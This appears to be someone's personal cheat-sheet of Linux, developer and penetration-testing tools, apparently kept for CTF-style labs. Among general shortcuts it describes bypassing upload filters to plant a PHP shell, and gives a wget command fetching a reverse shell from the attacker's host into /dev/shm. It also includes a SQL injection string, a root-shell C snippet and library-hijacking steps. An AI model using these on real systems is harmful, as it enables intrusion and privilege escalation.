Useful tools
============

github-awesome
--------------

https://github.com/chubin/awesome-console-services
https://github.com/herrbischoff/awesome-command-line-apps#readme
https://github.com/agarrharr/awesome-cli-apps
https://github.com/awesome-lists/awesome-bash
https://github.com/alebcay/awesome-shell  -- AWESOME!!!!
https://github.com/vinta/awesome-python

How2
----
git clone https://github.com/VladimirMikulic/how2
or git@github.com:bodgergely/how2.git
sudo npm i -g ./how2

History (hstr)
--------------
sudo add-apt-repository ppa:ultradvorka/ppa && sudo apt-get update && sudo apt-get install hstr && hstr --show-configuration >> ~/.bashrc && . ~/.bashrc

Jump (jump to directory)
------------------------
https://github.com/gsamokovarov/jump

go get github.com/gsamokovarov/jump
eval "$(jump shell)"
or 
jump shell >> ~/.bashrc

CookieCutter
------------

Generate templates for projects based on language

Terminal Color database
-----------------------

bash -c  "$(wget -qO- https://git.io/vQgMr)"

Digital Ocean cmd line
----------------------
https://github.com/omgimanerd/doclt
npm install -g doclt
doclt

Git
---

To tell your current branch to start tracking another remote branch:
git branch -u origin/dev

Git extras
----------
https://github.com/tj/git-extras/blob/master/Commands.md
sudo apt-get install git-extras

sudo npm install --global git-open

https://github.com/arzzen/git-quick-stats
git-quick-stats


Basic tools
-----------
- whatis - Basic info about a program
- nmap, nc, socat
- vi, vim
- bash, tmux
- less, more, cat
- wc, sort, uniq, bc, column
- sed, awk
- searchsploit
- dirbuster, dirb, gobuster, dirsearch
- sqlmap
- wfuzz
- burp or BurpSuiteCommunity, ProxyFoxy for firefox
- owasp-zap - it is like an open source Burp
- netstat
- ifconfig, ip, ss
- msfconsole 
- python for simple webserver
- gcc
- curl, wget, dig, nslookup, whois, host
- md5sum, base64, `base64 -d <file>`, `base64 <file>`
- radare2, xxd, hexdump, objdump
- tcpdump, Wireshark
- apt, dpkg, dpkg -l
- ssh - IMPORTANT to know well for tunnels
- date - to get time
- find, grep, fzf, locate
- env: prints the ENV vars, same as printenv
- hashid: Identify the different types of hashes used to encrypt data
- tee: write stdin to file and to stdout
- jq: JSON decoding, `jq . filename`


Network tools
-------------

- ifconfig
- ip
- iptables
- nethogs => analyze which processes are doing network IO bandwidth
- traceroute (with icmp option)
- curl
- nc

Perf tools
----------
- /usr/share/bcc/tools - eBPF profiling
- atop
- htop
- top
- powertop
- glances (https://github.com/nicolargo/glances)
- gprof
- perf
- /proc/loadavg (1,5,15min loadavg, running/total, last proc pid)
- /proc/<pid>/schedstat - task scheduling related statistics

bcc
---

bpf tools
on github iovisor/bcc

/usr/share/bcc/tools

htop
----
F1 - help
Shift+H - show/hide user threads
Shift+K - show/hide kernel threads
Shift-P - cpu sort
Shift-M - mem sort
https://peteris.rocks/blog/htop/
https://www.maketecheasier.com/power-user-guide-htop/

top
---

STAT meaning:
PROCESS STATE CODES
       Here are the different values that the s, stat and state output specifiers (header "STAT" or "S") will display to describe the state of a process:
       D    uninterruptible sleep (usually IO)
       R    running or runnable (on run queue)
       S    interruptible sleep (waiting for an event to complete)
       T    stopped, either by a job control signal or because it is being traced.
       W    paging (not valid since the 2.6.xx kernel)
       X    dead (should never be seen)
       Z    defunct ("zombie") process, terminated but not reaped by its parent.

       For BSD formats and when the stat keyword is used, additional characters may be displayed:
       <    high-priority (not nice to other users)
       N    low-priority (nice to other users)
       L    has pages locked into memory (for real-time and custom IO)
       s    is a session leader
       l    is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)
       +    is in the foreground process group.

Binary analysis
---------------
binwalk, xxd, hexdump, obnjdump, radare2, strings
exiftool - inspect image
ldd - list all linked libraries
ldconfig - configure dynamic run time linker (/etc/ld.so.conf.d)
    - configures the location of dynamic libraries to look at
    - we can change the dynamic library binding by manipulating the binding path

Radare2
-------
a - analyze
aaa
afl - list functions
a? - get options for analyze
pdf @ main - print-disassemble-function main
pdc @ main - print-disass-C-like-decompile


Reckon tools
------------

- nmap -sC -sV -oA nmap <IP>
- dirb
    This tool enumerates url paths based on a wordlist
- dirbuster
- gobuster -u <URL> -w <path-to-worldlistfile> -o <outputfile>

- Worldlists:
    - /usr/share/wordlists/ on Kali
    - `cewl` -> worlist generator based on spidering a website, wordlist can be used for john the ripper

- Burp Suite - get the Firefox plugin FoxyProxy to use it
    Proxy, Repeater (ctrl+r to send a capture to the repeater)

- joomscan: Joomla vulnerability scanner

- LinEnum: enumerate Linux vulnerablities #nice
    https://github.com/rebootuser/LinEnum.git
    - /opt/LinEnum/LinEnum.sh
        You can just spawn a simple HTTPServer on your pentest box and curl the script into the
            victim's machine


Password Cracking
-----------------
If we have let's say an MD5 hash of a password we can use hashcat to try to crack it. Plus
we need a wordlist, like rockyou.txt

- john: John the Ripper
- cewl - to generate wordlist
- hashcat
- hydra, hydra-gtk

Metasploit
----------

- msfconsole
- msfdb run

Commands:
    - search progname
    - use <modulename>
    - info
    - show options
    - set RHOSTS 10.10.10.134
    - run


pwntools
--------

python library for CTF and hacking.

Web Application hacking
-----------------------

When filling out web forms we can capture that request with Burp.
Then copy the request to a file and use sqlmap to try and to sql injection.
For instance we try a login form, capture that and copy the request to login.req.

`sqlmap -r login.req --level 5 --risk 3`

- File upload explotiation is something should try first.
   Once we uploaded a file, we should guess the location of it by enumerating folders.
    Usually **/uploads or **/upload 
    
  File types to upload:
    - php scripts! They can give you a reverse shell. There is some github project
        which hosts php-reverse-shell.php or something like this. Of course
        it only works if the web app is coded in php. 
    - Usually app will check if the uploaded file is the type it expects(ie image, PNG, JPEG etc)
        We can fool it by setting http header Content-Type: image/png and also by prepending
        our php code with some PNG start bytes, so if Linux runs `file` on it, it will be
        fooled into believing it is image. (file checks the magic bytes)
        Note that Web App Firewalls will inspect the POST data much more deeply and will
           recognize that we try something fishy.
    - Reverse shell file upload


Web App Fuzzing
---------------
### wfuzz - Web app fuzzer !!! #nice 

    `wfuzz -c --hw 36 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -d 'username=admin&password=FUZZ&submit=login' <URL>`

    The above wfuzz command will take every item from the above wordlist and subsitute with FUZZ.
    -d 'PAYLOAD' -> grab it via Burp, see what POST body is sent

    We can also fuzz cookies in the header for example. Not just the body.
      
    `wfuzz -c --hw 29 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -H 'Cookie:password=FUZZ' <URL>`

We can also put the FUZZ into the URL param list!

/usr/share/seclists/Fuzzing




Security dumps, files, wordlists
--------------------------------

SecLists - Password dumps etc.
https://github.com/danielmiessler/SecLists
Kali: apt -y install seclists
    - /usr/share/seclists/

/usr/share/wordlists/rockyou.txt - 134MB file - over 14 million passwords


Burp Suite
----------

Add to scope the site you care about and remove from scope all the other unrelated sites.
Do the same in the HTTP History tab under the Proxy tab.

- Repeater tab:
    - We can change the request method to POST from GET and vica versa
    - Can do conversions, url encoding etc


SQL Injection
-------------

Examples:
   ' or '1'='1

Applications:
    - sqlmap
    

Misc
----

base64  
    this program can encode/decode to/from base64 encoding
    `echo <base64-encoded-string> | base64 -d`

`find /home -type f -printf "%f\t%p\t%u\t%g\t%m" -maxdepth=2`
    Print files, and print different properties of the files to a certain depth.

`dpkg -l` | grep -i <name-of-package-of-interest>
    dpkg -l: will list all the installed software packages
    

Exploit tools
-------------

- searchsploit
    Searches exploitdb to look for exploits for a given application version.
    searchsploit -x 11746.txt to open the exploit

Reverse shells
--------------
- reverse shells:
    - python-pty-shells: just google it on GitHub:
        tcp_pty_backconnect.py

Injectable Web Exploit Code: /usr/share/laudanum/README   -- make sure to use this!!

- python2 -m SimpleHTTPServer
- python3 -m http.server
    These will spawn a simple webservers. This will allow us to download stuff from our machine to
        the machine where we placed the code executor php file. Just do a code execution of 
                wget <OUR-IP>:8000/tcp_pty_backconnect.py -O /dev/shm/.reverse_shell.py
        It is good practice to save a reverse shell to /dev/shm so it will not be saved to hard drive.

- `nc -nlvp <PORT>` to set up a listen "server" to accept incoming connections

- Once we uploaded the reverse shell using our simple http server, we do
      python tcp_pty_shell_handler.py -b <IP>:<PORT>
        then we execute the reverse shell on the remote machine and we get the shell.

Vulnerabilities
---------------

Old linux kernel - DIRTY COW exploitable
MOTD - PAM - Pluggable Authentication Module (searchsploit motd)

DNS
---
Tools:
    - nslookup, dig, host, dnsrecon

Usually on port 53 and UDP. If TCP then probably dns zone transfer is enabled.
    `dig axfr @<dnsserverIP>` - does zone transfer

```
$nslookup
> Server 10.10.10.29
Default server: 10.10.10.29
Address: 10.10.10.29#53
> 127.0.0.1
> 10.10.10.29
```

netstat, ports, tcp, ip
-----------------------

sudo netstat -ltup - listening ports
ip route show table local

ss - show sockets - another utility to investigate sockets 

ss -tuln          - -t: TCP, -u: UDP, -l: Listening, -n: do not resolve service names  




Documentation tool
------------------

- CherryTree
    Very good at taking notes and organize in a hierarchical way.
    
    C-n: new node
    C-S-n: new child node

Bash
----

Learn bash:
http://www.tldp.org/LDP/abs/html/

Links:
https://www.linux.com/learn/intro-to-linux/2017/4/fabulous-bash-navigation-shortcuts
https://www.ostechnix.com/list-useful-bash-keyboard-shortcuts/
https://unix.stackexchange.com/questions/231605/search-for-a-previous-command-with-the-prefix-i-just-typed

cd ~ : to go to home dir
cd - : to go back to previous dir

history: get the command history
ctrl-u: clear stuff before cursor
ctrl-c: erase the command
ctrl-r: search history backward
ctrl-s: search histroy forward
ctrl-g: leave history mode
ctrl-e: go to end
ctrl-a: go to beginning
ctrl-p: prev command
ctrl-n: next command
alt-b: move bach one word
alt-f: move forward one word
ctrl+left arrow: move bach one word
ctrl+right arrow: move forward one word

alt+.: inserts the last "word" of the previous command at the cursor. Repeat it to get the last word from older commands. 
ctrl+/: undo previosuly typed word


Lua
---

Lua in 15 minutes: http://tylerneylon.com/a/learn-lua/

Tmux shortcuts
--------------

C-b + n : next tab
C-b + p : prev tab
C-b + % : split tab vertically
C-b + " : split tab horizontally
C-b + , : rename tab
C-b + x : kill tab
C-b + <bracket> : to escape the command line and scroll into the text buffer
    Once in the text buffer mode:
    - search up: '?'
    - search down: '/'
Also possible to copy the tmux window contents by simply highlighting using the mouse and releasing it and it will
    be copied to the clipboard

alt-h - go to left pane
alt-l - go to right pane


Apt, dpkg, package, apt-get
---------------------------

Links


[Ubuntu apt repo guide](https://help.ubuntu.com/community/Repositories)
[Create local apt repo](https://askubuntu.com/questions/170348/how-to-create-a-local-apt-repository)

gdb shortcuts
-------------

C-x + a - enter tui window/exit tui window
C-x + o - switch to next focus (focus cmd -> focus src)

Awk
===

https://stackoverflow.com/questions/450799/shell-command-to-sum-integers-one-per-line
https://likegeeks.com/awk-command/

Sum numbers on each line the first element and save to file
    awk '{s+=$1} END {print s}' mydatafile


Python
======

navigate back and forth with C+p and C+n to get prev, next command
Better to use ipython for code completion


requests
--------
```
import requests
response = requests.get(url)  # GET request
reponse.text                  # grab the body
response = requests.head(url) # HEAD request
response.headers              # grab the headers
dir(response)                 # see what data, methods we have on this object

```

Virtual Host Routing
--------------------

Request going to the same IP but with different Host http header field will get routed to different
web sites.



Binary hacking
==============

1. Hijacking dynamic function calls #nice
    we can change the dynamic library path using ldconfig. Write our own lib with
        a hijacked function in it. For example our own printf. Then running ldconfig will
        point the executables to load our new library at run time. 
        Dynamic loader config is at: /etc/ld.so.conf.d/ and just create a new file with
        a folder in it where you have your own hijacker library with printf redefined.


Exploitable binary list
-----------------------

https://gtfobins.github.io/

    
Bash in C
---------
With root priviliges:
```
#include <stdlib.h>
extern int bash();

int bash() {
    setreuid(0, 0);
    execve("/bin/bash", NULL, NULL);
}
```


Vim
---
:wq - write and quit
:q! - write and discard changes
:w  - save
C-s - save
:q - quit
:tabe - open new tab
:vs - open vertical split
:%s/foo/bar/g   - replace 'foo' with 'bar' globally
:%!xdd - invoke HEX editor

:help - invoke help on subject
r - replace character
a - insert mode, append after cursor
i - insert mode, before cursor
o - insert empty line below curr line
O - insert empty line above curr line
v - enter visual mode
p - paste clipboard
gt - go to next tab
C-h - go to left pane
C-l - go to right pane
C-k - go to up pane
C-j - go to down pane

C-d - go down by many lines
C-u - go up by many lines
cw - delete word starting from cursor (insert mode)
dw - delete word starting from cursor (normal mode)
ciw - delete word  (insert mode)
diw - delete word  (normal mode)
/ - search forward
? - search backwards
* - highlight words and cycle through occurences
n - jump to next occurence
N - jump to prev occurence
ff - yank current line (originally yy)
dd - delete line
cc - delete line and insert mode
S-a - jump to end in insert mode 
S-d - delete up to end of line from current cursor pos
S-c - delete up to end of line from current cursor pos and insert mode
zz  - center view on current line
Tab - go forward to cursor pos
C-o - go back to prev cursor pos
C-] - go to tag
:tag NameOfTag  - go to tag
gg - jump to top
S-g - jump to buttom
$ - jump end of line
0 - jump beginning of line
u - undo
C-r - redo
,-t - Tagbar
:tag <TagName> - jump to tag name
:YcmCompleter GoTo - jump to tag
,-nt - Nerdtree
,-f - grep
,ww - grep for word under cursor (EasyGrep)
,-w - easymotion forward
,-b - easymotion backward
,q - quick open search results
,gb - GitBlame (fugitive - git)
Recording:
    - q-<alphanum>
    - do your things to be recorded
    - press q
    - apply the recording with @-<alphanum>, or simply @-@ 
. - to apply prev command
C-v - block select mode
Changing a block selection:
    - C-v to block select text area
    - hit c to get into insert mode
    - Write your change
    - escape from insert mode -> replaces with your text all block selection


gcc
---

Sharedlib:
    gcc -shared -fPIC -o libbash.so bash.c

gdb
===
https://ftp.gnu.org/old-gnu/Manuals/gdb/html_node/gdb_57.html
set print array on
set print pretty on
layout split (asm + src)
Ctrl-x + a  - enter tui graphical mode
focus cmd
focus src
Can focus with shortcut: Ctrl-x + o
apropos REGEX - get help
help


GDB python API:
---------------
http://blog.scottt.tw/2012/01/exploring-gdb-python-api-with-ipython_31.html

example:
t.py
```
import gdb
gdb.execute('file /bin/cat')
o = gdb.execute('disassemble exit', to_string=True)
print(o)
gdb.execute('quit')
```
```
gdb -x t.py
```


Kernel debugging
================

ftrace
------
- trace-cmd
- kernelshark


Kubernetes
==========

alias k=kubectl
k get pods
k cluster-info

Filesystem
==========

sudo apt install xfsprogs
$ mkfs.xfs
$ mkfs.ext4

Create ext4/xfs RAM filesystem:
https://unix.stackexchange.com/questions/401295/how-can-i-create-an-ext4-ramdisk

mkdir /mnt/ramdisk
mount -t ramfs ramfs /mnt/ramdisk
dd if=/dev/zero of=/mnt/ramdisk/ext4.image bs=1M count=512
mkfs.ext4 /mnt/ramdisk/ext4.image
mkdir /mnt/ext4ramdisk
mount -o loop /mnt/ramdisk/ext4.image /mnt/ext4ramdisk





